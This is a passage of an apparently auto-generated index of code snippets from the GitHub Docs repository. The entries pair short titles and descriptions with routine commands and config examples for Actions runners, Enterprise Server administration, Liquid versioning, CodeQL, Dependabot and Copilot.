https://github.com/github/docs/blob/main/data/reusables/actions/supported-github-runners.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nmacos-13\n```\n\nLANGUAGE: YAML\nCODE:\n```\nmacos-latest\n```\n\nLANGUAGE: YAML\nCODE:\n```\nmacos-14\n```\n\nLANGUAGE: YAML\nCODE:\n```\nmacos-15\n```\n\n----------------------------------------\n\nTITLE: Desktop Section Liquid Tag\nDESCRIPTION: Defines another section of content specific to `desktop`. It is used to display desktop specific content in another section.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tool-specific.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n{% desktop %}\n\n## Desktop section\n\nDesktop section specific content\n\n{% enddesktop %}\n```\n\n----------------------------------------\n\nTITLE: Applying a Hotpatch to GitHub Enterprise Cluster (Shell)\nDESCRIPTION: This command applies a hotpatch to all nodes in the GitHub Enterprise Server cluster. The script installs the hotpatch and restarts services in the correct sequence to minimize downtime.  It requires the `ghe-cluster-hotpatch` command line utility.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-hotpatch https://HOTPATCH-URL/FILENAME.hpkg\n```\n\n----------------------------------------\n\nTITLE: Conditional Display of API Insights Link (Liquid)\nDESCRIPTION: This snippet conditionally displays a link to the \"Viewing API Insights in Your Organization\" documentation if the `api-insights` version is enabled. The link is generated using the `AUTOTITLE` shortcode.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/organizations/api-insights-learn-about.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion api-insights %}To learn about viewing an organization's API activity, including which requests exceeded primary rate limits, see [AUTOTITLE](/organizations/managing-programmatic-access-to-your-organization/viewing-api-insights-in-your-organization).{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Searching audit log for repository actions\nDESCRIPTION: Example search query that filters actions on the repository `octocat/Spoon-Knife` since the beginning of 2017. It demonstrates the use of the `repo` and `created` qualifiers.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/searching-the-audit-log-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\nrepo:\"octocat/Spoon-Knife\" created:>=2017-01-01\n```\n\n----------------------------------------\n\nTITLE: Updating node eligibility in NES using nes set-node-eligibility\nDESCRIPTION: This snippet shows how to update a node's eligibility in Node Eligibility Service (NES) using the `nes set-node-eligibility` command. Replace HOSTNAME with the hostname of the node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-eligibility eligible HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Setting up GitHub Copilot in Vim/Neovim\nDESCRIPTION: This command initiates the setup process for GitHub Copilot within the Vim or Neovim editor. It handles the initial configuration steps required to integrate Copilot into the editor environment. No specific dependencies are listed, but a working Vim/Neovim installation is presumed.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/config-enable-copilot-in-vimneovim.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n:Copilot setup\n```\n\n----------------------------------------\n\nTITLE: Example URL for filtered issues\nDESCRIPTION: This is an example URL demonstrating how issue filters are represented in the URL. It shows issues that are open, of type issue, assigned to hubot, and sorted by creation date ascending. This is not executable code, but rather an illustration of the URL structure.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/filtering-and-searching-issues-and-pull-requests.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n/issues?q=state:open+type:issue+assignee:hubot+sort:created-asc\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query with Variables\nDESCRIPTION: This GraphQL query demonstrates how to use variables to specify the number of repositories to retrieve.  It shows the structure required for submitting the query using a POST request with curl and also the format for using it directly within the GraphQL Explorer's query and variables panes. The `number_of_repos` variable is used to limit the number of repositories returned.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-explorer.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nquery($number_of_repos:Int!){\n  viewer {\n    name\n     repositories(last: $number_of_repos) {\n       nodes {\n         name\n       }\n     }\n   }\n}\nvariables {\n   \"number_of_repos\": 3\n}\n```\n\nLANGUAGE: graphql\nCODE:\n```\n{\n   \"number_of_repos\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: npm .npmrc Configuration\nDESCRIPTION: This snippet shows a `.npmrc` file configuration for npm, specifying the private registry URL. This configuration ensures that npm resolves dependencies from the specified private registry.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n registry=https://private_registry_url\n```\n\n----------------------------------------\n\nTITLE: Starting the Sinatra web server\nDESCRIPTION: This shell command is used to start the Sinatra web server.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_20\n\nLANGUAGE: shell\nCODE:\n```\nbundle exec ruby server.rb\n```\n\n----------------------------------------\n\nTITLE: List Codespaces for a User in an Organization using GitHub CLI\nDESCRIPTION: This command lists all current codespaces for a specific user within a specified organization using the GitHub CLI. It requires the user executing the command to be an organization owner.  Replace `ORGANIZATION` with the actual organization name and `USER` with the username. The output includes the same information as the previous command.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/managing-codespaces-for-your-organization/listing-the-codespaces-in-your-organization.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace list --org ORGANIZATION --user USER\n```\n\n----------------------------------------\n\nTITLE: HTML details example\nDESCRIPTION: A complete HTML details tag with markdown table example\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<details>\n<summary>My top languages</summary>\n\n| Rank | Languages |\n|-----:|-----------|\n|     1| JavaScript|\n|     2| Python    |\n|     3| SQL       |\n\n</details>\n```\n\n----------------------------------------\n\nTITLE: Changing Directory for Git LFS Installation (Linux specific version)\nDESCRIPTION: This command changes the current working directory in the terminal to the directory where the downloaded and unzipped Git LFS files are located. This is a necessary step before running the installation script. The specific directory will depend on the user's download location and the version of Git LFS downloaded. This is the Linux specific example.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/installing-git-large-file-storage.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ncd ~/Downloads/git-lfs-1.X.X\n```\n\n----------------------------------------\n\nTITLE: Creating a Docs Directory in Shell\nDESCRIPTION: This shell command creates a new directory named `docs` and then changes the current working directory into it.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nmkdir docs\ncd docs\n```\n\n----------------------------------------\n\nTITLE: Configuring version redirects in text file\nDESCRIPTION: This text snippet illustrates how to redirect URLs for specific versions of an article to a different version using the `redirect-exceptions.txt` file. In this example, URLs for enterprise-server versions 3.3, 3.4, and 3.5 are redirected to the enterprise-cloud version of the same article. This is necessary when a version of an article is removed or needs to be redirected to a more current version.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/configuring-redirects.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n/enterprise-cloud@latest/organizations/managing-membership-in-your-organization/exporting-member-information-for-your-organization\n  - /enterprise-server@3.3/organizations/managing-membership-in-your-organization/exporting-member-information-for-your-organization\n  - /enterprise-server@3.4/organizations/managing-membership-in-your-organization/exporting-member-information-for-your-organization\n  - /enterprise-server@3.5/organizations/managing-membership-in-your-organization/exporting-member-information-for-your-organization\n```\n\n----------------------------------------\n\nTITLE: Setting GPG Subkey in Git Configuration (Shell)\nDESCRIPTION: This snippet sets the global Git configuration to use a specific GPG subkey for signing commits.  The `git config` command with the `--global` flag modifies the global Git configuration file. Replace `4BB6D45482678BE3` with your actual GPG subkey ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/paste-gpg-key-id.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit config --global user.signingkey 4BB6D45482678BE3\n```\n\n----------------------------------------\n\nTITLE: Watch All Tests\nDESCRIPTION: Runs a script that watches for file changes and automatically re-runs the tests. This provides continuous feedback on the test status and displays a test coverage report. This command is useful for iterative development and ensuring changes don't break existing functionality.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm run test-watch\n```\n\n----------------------------------------\n\nTITLE: Exact Match Code Search\nDESCRIPTION: This snippet demonstrates how to search for an exact string, including whitespace, by surrounding the string in quotes.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n\"sparse index\"\n```\n\n----------------------------------------\n\nTITLE: Running the General Search Scrape Script\nDESCRIPTION: This command initiates the scraping script to extract data from the Docs site for general search indexing.  It requires a running server started with `npm run general-search-scrape-server`.  The `<scrape-directory>` argument specifies the directory where the scraped JSON files will be saved.\nSOURCE: https://github.com/github/docs/blob/main/src/search/scripts/scrape/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm run general-search-scrape -- <scrape-directory>\n```\n\n----------------------------------------\n\nTITLE: Enabling X-Forwarded-For Support on GHES (Shell)\nDESCRIPTION: This code snippet shows how to enable the `X-Forwarded-For` header on a GitHub Enterprise Server instance. It uses the `ghe-config` command to set the `loadbalancer.http-forward` configuration option to `true` and then applies the changes using `ghe-cluster-config-apply`. Enabling this header allows the instance to properly capture the client's IP address from the `X-Forwarded-For` header added by the load balancer.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/cluster-network-configuration.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config 'loadbalancer.http-forward' 'true' && ghe-cluster-config-apply\n```\n\n----------------------------------------\n\nTITLE: Showing Policy Controller Helm Values\nDESCRIPTION: This command displays the configurable values for the policy-controller Helm chart. This is useful for understanding all available options and their default settings. It uses the `helm show values` command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nhelm show values oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller --version v0.12.0-github12\n```\n\n----------------------------------------\n\nTITLE: Languages Configuration Location\nDESCRIPTION: This snippet provides the location of the JavaScript file that manages the enabled languages and their corresponding source directories within the GitHub Docs application. This file ensures that both English and translated content are included in the Docker image during deployment.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nsrc/languages/lib/languages.js\n```\n\n----------------------------------------\n\nTITLE: Creating a chroot Environment tar.gz Archive\nDESCRIPTION: This command creates a gzipped tar archive of the chroot environment.  It is important that the archive does not contain leading directory paths. `/bin/sh` must exist and be executable.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-environment.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ncd /path/to/chroot\ntar -czf /path/to/pre-receive-environment.tar.gz .\n```\n\n----------------------------------------\n\nTITLE: Updating Organization Membership Visibility (Shell)\nDESCRIPTION: Enforces the default organization membership visibility setting on all members using the `ghe-org-membership-update` utility. The `--visibility` option specifies the setting, which can be `public` or `private`. Replace `SETTING` with the desired visibility.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_108\n\nLANGUAGE: shell\nCODE:\n```\nghe-org-membership-update --visibility=SETTING\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row Definition\nDESCRIPTION: This demonstrates defining the table header separators and table content based on conditional versioning. The `-:` separates the header and data rows in markdown tables.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_6\n\nLANGUAGE: Markdown\nCODE:\n```\n| Package manager | Languages | Recommended formats | All supported formats | {% ifversion fpt %}\n| :- | :- | :- | :-|{% endif %}{% ifversion volvo %}\n|Cargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock`| {% endif %}\n```\n\n----------------------------------------\n\nTITLE: Displaying Codespace Logs Using GitHub CLI\nDESCRIPTION: This code snippet demonstrates how to display codespace logs using the `gh codespace logs` subcommand in the GitHub CLI. After entering the command, the user is prompted to select a codespace from a list.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/github-codespaces-logs.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace logs\n```\n\n----------------------------------------\n\nTITLE: Web Application Flow Token Response\nDESCRIPTION: Example token response from the web application flow. This part is a placeholder.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app.md#_snippet_5\n\nLANGUAGE: Placeholder\nCODE:\n```\n{% data reusables.apps.web-app-flow-token-response %}\n```\n\n----------------------------------------\n\nTITLE: Granting Copilot Access via REST API\nDESCRIPTION: This section describes how to use the GitHub REST API to grant access to GitHub Copilot for teams or specific users in an organization. It links to specific API endpoints for adding teams and users to the Copilot subscription.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization/granting-access-to-copilot-for-members-of-your-organization.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nSee [Add teams to the Copilot subscription for an organization](/rest/copilot/copilot-user-management?apiVersion=2022-11-28#add-teams-to-the-copilot-subscription-for-an-organization) and [Add users to the Copilot subscription for an organization](/rest/copilot/copilot-user-management?apiVersion=2022-11-28#add-users-to-the-copilot-subscription-for-an-organization).\n```\n\n----------------------------------------\n\nTITLE: Making Language Allow List ReadOnly - XML\nDESCRIPTION: This XML snippet demonstrates how to make the languageAllowList read-only in the IDE's settings. This prevents users from changing the language settings directly in the IDE.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_4\n\nLANGUAGE: XML\nCODE:\n```\n<application>\n  <component name=\"github-copilot\">\n    <option name=\"languageAllowListReadOnly\" value=\"true\" />\n    <languageAllowList>\n      <map>\n        <entry key=\"*\" value=\"true\" />\n      </map>\n    </languageAllowList>\n  </component>\n</application>\n```\n\n----------------------------------------\n\nTITLE: Escaping Liquid Code with Raw Tag\nDESCRIPTION: This snippet demonstrates the use of the `raw` tag in Liquid to prevent the enclosed code from being interpreted as Liquid code.  This is useful when you want to display Liquid syntax without it being processed by the Liquid engine. The raw tag block must be closed with `endraw`.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/raw.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n{% raw %}\n```shell\n{% data foo.bar.buzz %}\n{{ page.title }}\n```\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Checking for Deleted Files with Open File Handles\nDESCRIPTION: This command is used to check for large files that have been deleted but still have open file handles. These files continue to consume disk space until the file handles are closed. It helps identify and address disk space issues caused by such files.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nghe-check-disk-usage\n```\n\n----------------------------------------\n\nTITLE: Example Image Source Label in Dockerfile\nDESCRIPTION: This snippet is an example of the previous snippet, showing a concrete example of how to use the `LABEL` command in the Dockerfile.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nLABEL org.opencontainers.image.source=https://{% ifversion fpt or ghec %}github.com{% else %}{% data reusables.package_registry.container-registry-example-hostname %}{% endif %}/octocat/my-repo\n```\n\n----------------------------------------\n\nTITLE: Running Specific Playwright Test File\nDESCRIPTION: This command runs Playwright tests in a specific file, allowing focused testing.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- playwright-rendering.spec.ts\n```\n\n----------------------------------------\n\nTITLE: Changing Directory to Local Repository\nDESCRIPTION: This command navigates the terminal to the local directory where the documentation repository has been cloned. Replace `~/my-cloned-repos/docs` with the actual path.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncd ~/my-cloned-repos/docs\n```\n\n----------------------------------------\n\nTITLE: Workflow Status Badge URL Structure\nDESCRIPTION: This snippet shows the general URL structure for constructing a workflow status badge. The `HOSTNAME` is conditional based on the GitHub version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge.md#_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n{% ifversion fpt or ghec %}https://github.com{% else %}HOSTNAME{% endif %}/OWNER/REPOSITORY/actions/workflows/WORKFLOW-FILE/badge.svg\n```\n\n----------------------------------------\n\nTITLE: Defining the REST API URL prefix\nDESCRIPTION: This snippet defines the base URL that prefixes most of the REST API endpoints for GitHub Enterprise administration. The variable `{% data variables.product.rest_url %}` represents the actual URL.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/index.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n{% data variables.product.rest_url %}\n```\n\n----------------------------------------\n\nTITLE: Creating a New Linter Rule Template\nDESCRIPTION: This is a basic template for a new linter rule. It imports `addError` from 'markdownlint-rule-helpers'. The exported object defines the rule's `names`, `description`, `tags`, `parser`, and `function`. The `function` contains the logic to check for violations and calls `addError` when a violation is found. The function receives `params` for configuration and `onError` for reporting errors.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/README.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addError } from 'markdownlint-rule-helpers'\n\nexport const myRule = {\n  names: [],\n  description: '',\n  tags: [],\n  parser: 'markdownit',\n  function: (params, onError) => {\n    // Logic to check for violations of the rule\n\n    // If a violation is found, call addError\n    addError(\n      ... // error parameters\n    )\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Monitoring Self-Hosted Runner with journalctl - Shell\nDESCRIPTION: This `journalctl` command monitors the real-time activity of a self-hosted runner service on Linux. It filters the logs for a specific service unit (e.g., `actions.runner.octo-org-octo-repo.runner01.service`) and follows the output using the `-f` flag.  It requires sudo privileges. This command assumes the runner application runs as a systemd service.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nsudo journalctl -u actions.runner.octo-org-octo-repo.runner01.service -f\n```\n\n----------------------------------------\n\nTITLE: Escaping Quotes in Code Search\nDESCRIPTION: This snippet demonstrates how to search for code containing a quotation mark by escaping it with a backslash. It searches for the exact string `name = \"tensorflow\"`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n\"name = \\\"tensorflow\\\"\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on GHES version\nDESCRIPTION: This snippet demonstrates conditional rendering using the `ifversion` tag in Liquid, specifically checking if the GHES version is less than 2.14. If true, the 'Bravo' text is rendered; otherwise, nothing is rendered within the `if` block. This is useful for deprecating content in older versions.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.14 %}\n\nBravo\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Start Test Server\nDESCRIPTION: Starts a test server on port 4000. This is used when running `vitest` tests that depend on making real HTTP requests to `localhost:4000`. The server provides a testing environment for these types of tests.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nNODE_ENV=test PORT=4000 tsx src/frame/server.ts\n```\n\n----------------------------------------\n\nTITLE: Defining qlpack.yml Dependencies for C++\nDESCRIPTION: This YAML snippet demonstrates how to create a `qlpack.yml` file that defines dependencies for a custom CodeQL pack for C++. It specifies the name, version, and library path dependencies, ensuring that the custom pack can access the standard C++ library. The `libraryPathDependencies` key is used to declare dependencies on other CodeQL packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/setting-up-a-codeql-workspace.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-custom-cpp-pack\nversion: 0.0.0\nlibraryPathDependencies: codeql/cpp-all\n```\n\n----------------------------------------\n\nTITLE: Setting Accept Header for Project Card Preview\nDESCRIPTION: This code snippet demonstrates how to set the Accept header to receive the `project_card` attribute in GitHub REST API responses. It requires that {% data variables.projects.projects_v1_boards %} be enabled for the repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/pre-release-program/starfox-preview.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\napplication/vnd.github.starfox-preview+json\n```\n\n----------------------------------------\n\nTITLE: Testing SSH over HTTPS Port - Bash\nDESCRIPTION: This command tests if SSH over the HTTPS port (443) is possible. It attempts to connect to the GitHub SSH server on port 443 and verifies successful authentication. Requires SSH client to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/using-ssh-over-the-https-port.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ ssh -T -p 443 git@ssh.github.com\n# Hi USERNAME! You've successfully authenticated, but GitHub does not\n# provide shell access.\n```\n\n----------------------------------------\n\nTITLE: Resolving CodeQL Dataset Upgrades with CLI\nDESCRIPTION: This shell command resolves the upgrades required for a raw CodeQL dataset. It takes the current dbscheme of the dataset as a mandatory input. The command outputs the upgrade scripts needed to bring the dataset to the state of the configured QL libraries. It utilizes the `codeql resolve upgrades` command with the `--dbscheme` option.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-upgrades.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve upgrades --dbscheme=<file> <options>...\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with else statement for FPT\nDESCRIPTION: This snippet checks if the current version is FPT and renders 'condition-b' if true; otherwise, it renders 'condition-c'.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\ncondition-b\n{% else %}\ncondition-c\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Installing a package with Maven\nDESCRIPTION: This shell command installs a package from GitHub Packages using the Maven install plugin. It requires the `settings.xml` and `pom.xml` files to be configured correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nmvn install\n```\n\n----------------------------------------\n\nTITLE: Example SCIM Endpoint Usage\nDESCRIPTION: This code snippet demonstrates how to use the `Users` endpoint to retrieve information about a user. Note that these endpoints are case sensitive, so the capitalization in the URL is important. The `scim_user_id` is a placeholder for the actual SCIM user ID.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/scim/scim.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nGET /scim/v2/organizations/{org}/Users/{scim_user_id}\n```\n\n----------------------------------------\n\nTITLE: Configuring Helm Registry\nDESCRIPTION: This snippet configures access to a private Helm registry using a username and password. The registry type is `helm-registry`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  helm_registry:\n    type: helm-registry\n    url: https://registry.example.com\n    username: octocat\n    password: ${{secrets.MY_REGISTRY_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Outdated Git Checkout Step in CodeQL Workflow (YAML)\nDESCRIPTION: This snippet shows the outdated git checkout step that triggers the warning.  It includes fetching the parent and checking out `HEAD^2` only when triggered by a pull request. This step should be removed for optimal code scanning results.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/unnecessary-step-found.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n        with:\n          # We must fetch at least the immediate parents so that if this is\n          # a pull request then we can checkout the head.\n          fetch-depth: 2\n\n      # If this run was triggered by a pull request event, then checkout\n      # the head of the pull request instead of the merge commit.\n      - run: git checkout HEAD^2\n        if: {% raw %}${{ github.event_name == 'pull_request' }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Displaying warning message\nDESCRIPTION: This code snippet shows the warning message that is displayed when Kotlin files are detected in a project that could not be processed without a build.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/kotlin-detected-in-no-build.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nWarning: Detected X Kotlin files in your project that could not be processed without a build. To process these files...\n```\n\n----------------------------------------\n\nTITLE: Defining a \"New Conversation\" SVG Icon\nDESCRIPTION: This SVG code defines a \"New conversation\" icon using vector graphics. The icon is constructed from paths and shapes to visually represent a new conversation or message. The attributes define the shape, size, color, and other visual properties.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/pencil-paper-icon.md#_snippet_0\n\nLANGUAGE: SVG\nCODE:\n```\n<svg class=\"octicon\" aria-label=\"New conversation\" width=\"16\" height=\"16\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"currentColor\" fill-rule=\"evenodd\" d=\"M14.515.456a1.555 1.555 0 00-2.2 0L6.58 6.19a1.556 1.556 0 00-.396.673l-.825 2.89a.667.667 0 00.824.824l2.89-.826c.254-.072.485-.209.672-.396l5.735-5.734a1.556 1.556 0 000-2.2l-.965-.965zm-1.257.942a.222.222 0 01.314 0l.965.966a.222.222 0 010 .314L13.415 3.8l-1.28-1.28 1.123-1.122zm-2.065 2.066l1.279 1.279-3.67 3.67a.221.221 0 01-.096.056l-1.736.496.496-1.736c.01-.036.03-.07.057-.096l3.67-3.67zM1.639 4.778a2.25 2.25 0 012.25-2.25h3.154a.75.75 0 000-1.5H3.889a3.75 3.75 0 00-3.75 3.75v7.333a3.75 3.75 0 003.75 3.75h7.333a3.75 3.75 0 003.75-3.75V8.445a.75.75 0 00-1.5 0v3.666a2.25 2.25 0 01-2.25 2.25H3.889a2.25 2.25 0 01-2.25-2.25V4.778z\" clip-rule=\"evenodd\"></path></svg>\n```\n\n----------------------------------------\n\nTITLE: Svenska Markdown Example\nDESCRIPTION: This markdown snippet exemplifies a translated content where a liquid variable is placed. In case the liquid cannot be rendered, the fallback mechanism should provide the english content instead.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_10\n\nLANGUAGE: Markdown\nCODE:\n```\nDetta exemplet är på Svenska för skojs\nskull {% data variables.support.help %}.\n```\n\n----------------------------------------\n\nTITLE: Restart Server Command\nDESCRIPTION: This shell command restarts the Ruby server. It's used for testing changes.  `Ctrl-C` is used to stop the server if it is already running.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_35\n\nLANGUAGE: shell\nCODE:\n```\nruby server.rb\n```\n\n----------------------------------------\n\nTITLE: Configuring Git User Information\nDESCRIPTION: Configures Git with your name and email address using `git config`. This is necessary for attributing commits to the correct author. Replace `NAME` with your actual name and `EMAIL` with your email address.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-team-foundation-version-control-repository.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit config --global user.name \"NAME\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngit config --global user.email EMAIL\n```\n\n----------------------------------------\n\nTITLE: Generating Section Links in Markdown\nDESCRIPTION: This code snippet showcases how section links are automatically generated from headings in rendered Markdown content, demonstrating the rules for converting headings into valid URI fragments.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\n# Example headings\n\n## Sample Section\n\n## This'll be a _Helpful_ Section About the Greek Letter Θ!\nA heading containing characters not allowed in fragments, UTF-8 characters, two consecutive spaces between the first and second words, and formatting.\n\n## This heading is not unique in the file\n\nTEXT 1\n\n## This heading is not unique in the file\n\nTEXT 2\n\n# Links to the example headings above\n\nLink to the sample section: [Link Text](#sample-section).\n\nLink to the helpful section: [Link Text](#thisll-be-a-helpful-section-about-the-greek-letter-Θ).\n\nLink to the first non-unique section: [Link 